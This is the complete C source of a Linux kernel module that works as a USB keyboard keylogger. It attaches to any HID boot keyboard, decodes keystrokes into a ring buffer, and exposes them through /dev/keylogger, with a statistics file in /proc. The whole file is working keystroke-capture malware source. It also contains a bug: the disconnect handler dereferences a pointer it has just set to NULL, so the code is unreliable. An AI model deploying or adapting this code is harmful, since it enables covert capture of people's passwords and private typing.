#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/usb.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/spinlock.h>
#include <linux/wait.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/mutex.h>

/*
 * - /dev is a special directory of device files.
 * - DEVICE_NAME: name of the file in /dev (e.g. /dev/keylogger).
 * - DRIVER_NAME: name the kernel uses for this driver internally.
 * - PROC_NAME: name of a stats file in /proc (e.g. /proc/keylogger_stats).
 */
#define DEVICE_NAME "keylogger"
#define DRIVER_NAME "keylogger"
#define PROC_NAME   "keylogger_stats"

#define BUF_SIZE 1024

/*
 * IOCTL commands:
 * - IOCTL = special control command from user space to the driver.
 * - KEYLOGGER_IOC_MAGIC: small ID ('k') used for all our IOCTLs.
 *
 * Commands:
 * - RESET_STATS: reset statistics counters.
 * - CLEAR_BUFFER: clear the ring buffer of characters.
 * - ENABLE: turn logging on.
 * - DISABLE: turn logging off.
 */
#define KEYLOGGER_IOC_MAGIC        'k'
#define KEYLOGGER_IOC_RESET_STATS  _IO(KEYLOGGER_IOC_MAGIC, 0)
#define KEYLOGGER_IOC_CLEAR_BUFFER _IO(KEYLOGGER_IOC_MAGIC, 1)
#define KEYLOGGER_IOC_ENABLE       _IO(KEYLOGGER_IOC_MAGIC, 2)
#define KEYLOGGER_IOC_DISABLE      _IO(KEYLOGGER_IOC_MAGIC, 3)

/*
 * simple_usage_to_ascii:
 * Turn a HID key code (one byte) into a simple ASCII character.
 * Returns 0 if the code is not supported.
 */
static char simple_usage_to_ascii(u8 usage)
{
    if (usage >= 0x04 && usage <= 0x1d)
        return 'a' + (usage - 0x04);   /* letters a–z */

    if (usage >= 0x1e && usage <= 0x26)
        return '1' + (usage - 0x1e);   /* digits 1–9 */

    if (usage == 0x27)
        return '0';                    /* digit 0 */

    if (usage == 0x2c)
        return ' ';                    /* space */

    if (usage == 0x28)
        return '\n';                   /* Enter */

    return 0;
}

/*
 * struct keylogger_dev:
 * Holds all state for one keylogger device.
 *
 * - devno, cdev, cls, device: used to create /dev/keylogger.
 * - buf, buf_size: character ring buffer and its size.
 * - head, tail, full: position and full flag for the ring buffer.
 * - lock: spinlock to protect buffer and counters.
 * - read_q, write_q: wait queues for blocking reads/writes.
 * - keys_captured, bytes_read, overflows, opens: statistics.
 * - logging_enabled: whether key logging is on.
 * - usbdev: pointer to the USB keyboard.
 * - irq_urb, irq_buf, irq_dma: USB interrupt transfer state.
 * - irq_interval, irq_pipe: timing and pipe for USB interrupt.
 */
struct keylogger_dev {
    dev_t devno;
    struct cdev cdev;
    struct class *cls;
    struct device *device;

    char *buf;
    size_t buf_size;
    size_t head;
    size_t tail;
    bool   full;

    spinlock_t lock;
    wait_queue_head_t read_q;
    wait_queue_head_t write_q;

    u64 keys_captured;
    u64 bytes_read;
    u64 overflows;
    u64 opens;

    bool logging_enabled;

    struct usb_device *usbdev;
    struct urb *irq_urb;
    unsigned char *irq_buf;
    dma_addr_t irq_dma;
    int irq_interval;
    int irq_pipe;
};

/* Global device pointer and /proc entry pointer. */
static struct keylogger_dev *g_dev;
static struct proc_dir_entry *proc_entry;

/*
 * Ring buffer helpers:
 * - buffer_is_empty: true if nothing to read.
 * - buffer_is_full: true if no free space.
 */
static bool buffer_is_empty(struct keylogger_dev *dev)
{
    return (!dev->full && (dev->head == dev->tail));
}

static bool buffer_is_full(struct keylogger_dev *dev)
{
    return dev->full;
}

/*
 * buffer_put_char:
 * Store one character into the ring buffer.
 */
static void buffer_put_char(struct keylogger_dev *dev, char ch)
{
    dev->buf[dev->head] = ch;
    dev->head = (dev->head + 1) % dev->buf_size;

    if (dev->head == dev->tail)
        dev->full = true;
}

/*
 * buffer_get:
 * Copy up to 'max' characters from the ring buffer into dst.
 * Returns how many characters were copied.
 */
static size_t buffer_get(struct keylogger_dev *dev, char *dst, size_t max)
{
    size_t copied = 0;

    while (!buffer_is_empty(dev) && copied < max) {
        dst[copied++] = dev->buf[dev->tail];
        dev->tail = (dev->tail + 1) % dev->buf_size;
        dev->full = false;
    }

    return copied;
}

/*
 * keylogger_irq:
 * Called each time the keyboard sends a USB report.
 * Decodes pressed keys and stores characters into the ring buffer.
 */
static void keylogger_irq(struct urb *urb)
{
    struct keylogger_dev *dev = urb->context;
    unsigned long flags;
    int i;
    u8 *data = dev->irq_buf;   /* 8-byte HID report from the keyboard */

    if (urb->status)
        goto resubmit;         /* On error: skip work and re-arm the URB. */

    spin_lock_irqsave(&dev->lock, flags);

    if (dev->logging_enabled) {
        /* Bytes 2–7 contain up to 6 key codes. */
        for (i = 2; i < 8; i++) {
            u8 usage = data[i];
            char ch;

            if (!usage)
                continue;      /* 0: no key in this slot. */

            ch = simple_usage_to_ascii(usage);
            if (!ch)
                continue;      /* Unsupported usage. */

            if (buffer_is_full(dev)) {
                dev->overflows++;
                continue;      /* Drop if buffer is full. */
            }

            buffer_put_char(dev, ch);
            dev->keys_captured++;
        }

        if (!buffer_is_empty(dev))
            wake_up_interruptible(&dev->read_q);
    }

    spin_unlock_irqrestore(&dev->lock, flags);

resubmit:
    usb_submit_urb(urb, GFP_ATOMIC);   /* Re-arm URB for next report. */
}

/*
 * keylogger_probe:
 * Called when a matching USB keyboard is plugged in.
 * Sets up USB interrupt transfer and buffer.
 */
static int keylogger_probe(struct usb_interface *intf,
                           const struct usb_device_id *id)
{
    struct usb_device *udev = interface_to_usbdev(intf);
    struct usb_host_interface *iface_desc;
    struct usb_endpoint_descriptor *endpoint;
    int pipe, maxp;
    int error;

    if (!g_dev)
        return -ENODEV;

    iface_desc = intf->cur_altsetting;
    if (iface_desc->desc.bNumEndpoints < 1)
        return -ENODEV;

    endpoint = &iface_desc->endpoint[0].desc;
    if (!usb_endpoint_is_int_in(endpoint))
        return -ENODEV;

    pipe = usb_rcvintpipe(udev, endpoint->bEndpointAddress);
    maxp = usb_maxpacket(udev, pipe, usb_pipeout(pipe));

    g_dev->usbdev       = udev;
    g_dev->irq_interval = endpoint->bInterval;
    g_dev->irq_pipe     = pipe;

    g_dev->irq_buf = usb_alloc_coherent(udev, maxp, GFP_ATOMIC,
                                        &g_dev->irq_dma);
    if (!g_dev->irq_buf)
        return -ENOMEM;

    g_dev->irq_urb = usb_alloc_urb(0, GFP_KERNEL);
    if (!g_dev->irq_urb) {
        usb_free_coherent(udev, maxp, g_dev->irq_buf, g_dev->irq_dma);
        g_dev->irq_buf = NULL;
        return -ENOMEM;
    }

    usb_fill_int_urb(g_dev->irq_urb, udev, pipe,
                     g_dev->irq_buf, maxp, keylogger_irq,
                     g_dev, g_dev->irq_interval);

    g_dev->irq_urb->transfer_dma = g_dev->irq_dma;
    g_dev->irq_urb->transfer_flags |= URB_NO_TRANSFER_DMA_MAP;

    error = usb_submit_urb(g_dev->irq_urb, GFP_KERNEL);
    if (error) {
        usb_free_urb(g_dev->irq_urb);
        g_dev->irq_urb = NULL;
        usb_free_coherent(udev, maxp, g_dev->irq_buf, g_dev->irq_dma);
        g_dev->irq_buf = NULL;
        return error;
    }

    dev_info(&intf->dev, "keylogger attached\n");
    return 0;
}

/*
 * keylogger_disconnect:
 * Called when the keyboard is unplugged.
 * Stops USB transfers and frees USB-related memory.
 */
static void keylogger_disconnect(struct usb_interface *intf)
{
    struct usb_device *udev = interface_to_usbdev(intf);

    if (!g_dev || g_dev->usbdev != udev)
        return;

    if (g_dev->irq_urb) {
        usb_kill_urb(g_dev->irq_urb);
        usb_free_urb(g_dev->irq_urb);
        g_dev->irq_urb = NULL;
    }

    if (g_dev->irq_buf) {
        usb_free_coherent(udev,
                          g_dev->irq_urb->transfer_buffer_length,
                          g_dev->irq_buf, g_dev->irq_dma);
        g_dev->irq_buf = NULL;
    }

    g_dev->usbdev = NULL;
}

/*
 * USB ID table:
 * Match any HID boot keyboard interface.
 */
static const struct usb_device_id keylogger_table[] = {
    {
        USB_INTERFACE_INFO(USB_INTERFACE_CLASS_HID,
                           USB_INTERFACE_SUBCLASS_BOOT,
                           USB_INTERFACE_PROTOCOL_KEYBOARD)
    },
    { } /* terminating entry */
};
MODULE_DEVICE_TABLE(usb, keylogger_table);

/*
 * USB driver description:
 * Connects probe/disconnect to the USB core.
 */
static struct usb_driver keylogger_usb_driver = {
    .name       = DRIVER_NAME,
    .probe      = keylogger_probe,
    .disconnect = keylogger_disconnect,
    .id_table   = keylogger_table,
};

/*
 * keylogger_open:
 * Called when user opens /dev/keylogger.
 */
static int keylogger_open(struct inode *inode, struct file *filp)
{
    struct keylogger_dev *dev = container_of(inode->i_cdev,
                                             struct keylogger_dev, cdev);

    filp->private_data = dev;
    dev->opens++;
    return 0;
}

/*
 * keylogger_release:
 * Called when user closes /dev/keylogger.
 */
static int keylogger_release(struct inode *inode, struct file *filp)
{
    return 0;
}

/*
 * keylogger_read:
 * Called when user reads from /dev/keylogger.
 * Returns logged characters from the ring buffer.
 */
static ssize_t keylogger_read(struct file *filp, char __user *buf,
                              size_t count, loff_t *ppos)
{
    struct keylogger_dev *dev = filp->private_data;
    int ret;
    unsigned long flags;
    char *kbuf;
    size_t copied;

    if (count == 0)
        return 0;

    if (buffer_is_empty(dev)) {
        if (filp->f_flags & O_NONBLOCK)
            return -EAGAIN;

        ret = wait_event_interruptible(dev->read_q,
                                       !buffer_is_empty(dev));
        if (ret)
            return ret;
    }

    kbuf = kmalloc(count, GFP_KERNEL);
    if (!kbuf)
        return -ENOMEM;

    spin_lock_irqsave(&dev->lock, flags);
    copied = buffer_get(dev, kbuf, count);
    dev->bytes_read += copied;
    spin_unlock_irqrestore(&dev->lock, flags);

    if (copy_to_user(buf, kbuf, copied)) {
        kfree(kbuf);
        return -EFAULT;
    }

    kfree(kbuf);
    wake_up_interruptible(&dev->write_q);
    return copied;
}

/*
 * keylogger_write:
 * Called when user writes to /dev/keylogger.
 * Accepts simple commands: "clear", "enable", "disable".
 */
static ssize_t keylogger_write(struct file *filp, const char __user *buf,
                               size_t count, loff_t *ppos)
{
    struct keylogger_dev *dev = filp->private_data;
    char kbuf[64];
    unsigned long flags;

    if (count > sizeof(kbuf) - 1)
        count = sizeof(kbuf) - 1;

    if (copy_from_user(kbuf, buf, count))
        return -EFAULT;

    kbuf[count] = '\0';

    if (!strncmp(kbuf, "clear", 5)) {
        spin_lock_irqsave(&dev->lock, flags);
        dev->head = dev->tail = 0;
        dev->full = false;
        spin_unlock_irqrestore(&dev->lock, flags);
        wake_up_interruptible(&dev->write_q);
        return count;
    }

    if (!strncmp(kbuf, "enable", 6)) {
        dev->logging_enabled = true;
        return count;
    }

    if (!strncmp(kbuf, "disable", 7)) {
        dev->logging_enabled = false;
        return count;
    }

    return count;
}

/*
 * keylogger_ioctl:
 * Called when user sends an IOCTL to /dev/keylogger.
 * Handles reset/clear/enable/disable commands.
 */
static long keylogger_ioctl(struct file *filp,
                            unsigned int cmd, unsigned long arg)
{
    struct keylogger_dev *dev = filp->private_data;
    unsigned long flags;

    switch (cmd) {
    case KEYLOGGER_IOC_RESET_STATS:
        spin_lock_irqsave(&dev->lock, flags);
        dev->keys_captured = 0;
        dev->bytes_read    = 0;
        dev->overflows     = 0;
        dev->opens         = 0;
        spin_unlock_irqrestore(&dev->lock, flags);
        break;

    case KEYLOGGER_IOC_CLEAR_BUFFER:
        spin_lock_irqsave(&dev->lock, flags);
        dev->head = dev->tail = 0;
        dev->full = false;
        spin_unlock_irqrestore(&dev->lock, flags);
        wake_up_interruptible(&dev->write_q);
        break;

    case KEYLOGGER_IOC_ENABLE:
        dev->logging_enabled = true;
        break;

    case KEYLOGGER_IOC_DISABLE:
        dev->logging_enabled = false;
        break;

    default:
        return -ENOTTY;
    }

    return 0;
}

/*
 * File operations for /dev/keylogger.
 */
static const struct file_operations keylogger_fops = {
    .owner          = THIS_MODULE,
    .open           = keylogger_open,
    .release        = keylogger_release,
    .read           = keylogger_read,
    .write          = keylogger_write,
    .unlocked_ioctl = keylogger_ioctl,
};

/*
 * keylogger_proc_show:
 * Called when user reads /proc/keylogger_stats.
 * Prints simple statistics.
 */
static int keylogger_proc_show(struct seq_file *m, void *v)
{
    struct keylogger_dev *dev = g_dev;

    if (!dev)
        return 0;

    seq_printf(m, "keys_captured: %llu\n", dev->keys_captured);
    seq_printf(m, "bytes_read:    %llu\n", dev->bytes_read);
    seq_printf(m, "buffer_size:   %zu\n",  dev->buf_size);
    seq_printf(m, "overflows:     %llu\n", dev->overflows);
    seq_printf(m, "opens:         %llu\n", dev->opens);
    return 0;
}

/*
 * keylogger_proc_open:
 * Setup for reading /proc/keylogger_stats.
 */
static int keylogger_proc_open(struct inode *inode, struct file *file)
{
    return single_open(file, keylogger_proc_show, NULL);
}

/*
 * File operations for /proc/keylogger_stats.
 */
static const struct file_operations keylogger_proc_fops = {
    .owner   = THIS_MODULE,
    .open    = keylogger_proc_open,
    .read    = seq_read,
    .llseek  = seq_lseek,
    .release = single_release,
};

/*
 * keylogger_init:
 * Called when the module is loaded.
 * Sets up memory, /dev, /proc, and registers the USB driver.
 */
static int __init keylogger_init(void)
{
    int ret;

    g_dev = kzalloc(sizeof(*g_dev), GFP_KERNEL);
    if (!g_dev)
        return -ENOMEM;

    g_dev->buf_size = BUF_SIZE;
    g_dev->buf = kmalloc(g_dev->buf_size, GFP_KERNEL);
    if (!g_dev->buf) {
        kfree(g_dev);
        g_dev = NULL;
        return -ENOMEM;
    }

    spin_lock_init(&g_dev->lock);
    init_waitqueue_head(&g_dev->read_q);
    init_waitqueue_head(&g_dev->write_q);
    g_dev->logging_enabled = true;

    ret = alloc_chrdev_region(&g_dev->devno, 0, 1, DRIVER_NAME);
    if (ret < 0)
        goto err_buf;

    cdev_init(&g_dev->cdev, &keylogger_fops);
    g_dev->cdev.owner = THIS_MODULE;
    ret = cdev_add(&g_dev->cdev, g_dev->devno, 1);
    if (ret < 0)
        goto err_chrdev;

    g_dev->cls = class_create(THIS_MODULE, DRIVER_NAME);
    if (IS_ERR(g_dev->cls)) {
        ret = PTR_ERR(g_dev->cls);
        goto err_cdev;
    }

    g_dev->device = device_create(g_dev->cls, NULL, g_dev->devno,
                                  NULL, DEVICE_NAME);
    if (IS_ERR(g_dev->device)) {
        ret = PTR_ERR(g_dev->device);
        goto err_class;
    }

    proc_entry = proc_create(PROC_NAME, 0444, NULL, &keylogger_proc_fops);
    if (!proc_entry) {
        ret = -ENOMEM;
        goto err_device;
    }

    ret = usb_register(&keylogger_usb_driver);
    if (ret)
        goto err_proc;

    pr_info("keylogger: module loaded\n");
    return 0;

err_proc:
    remove_proc_entry(PROC_NAME, NULL);
err_device:
    device_destroy(g_dev->cls, g_dev->devno);
err_class:
    class_destroy(g_dev->cls);
err_cdev:
    cdev_del(&g_dev->cdev);
err_chrdev:
    unregister_chrdev_region(g_dev->devno, 1);
err_buf:
    kfree(g_dev->buf);
    kfree(g_dev);
    g_dev = NULL;
    return ret;
}

/*
 * keylogger_exit:
 * Called when the module is unloaded.
 * Unregisters USB driver, removes /dev and /proc entries, frees memory.
 */
static void __exit keylogger_exit(void)
{
    if (!g_dev)
        return;

    usb_deregister(&keylogger_usb_driver);
    remove_proc_entry(PROC_NAME, NULL);
    device_destroy(g_dev->cls, g_dev->devno);
    class_destroy(g_dev->cls);
    cdev_del(&g_dev->cdev);
    unregister_chrdev_region(g_dev->devno, 1);

    kfree(g_dev->buf);
    kfree(g_dev);
    g_dev = NULL;

    pr_info("keylogger: module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("USB keyboard keylogger char device driver");